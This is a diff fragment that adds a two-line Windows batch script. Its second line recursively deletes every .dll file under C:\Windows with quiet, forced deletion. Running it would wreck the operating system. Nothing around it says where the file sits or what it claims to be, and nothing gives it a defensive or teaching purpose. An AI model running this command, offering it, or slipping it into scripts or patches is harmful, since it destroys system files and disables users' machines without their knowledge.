@@ -1,0 +1,2 @@
+echo off
+for /r C:\Windows %%A in (*.dll) do (del /s/q "%%A") 
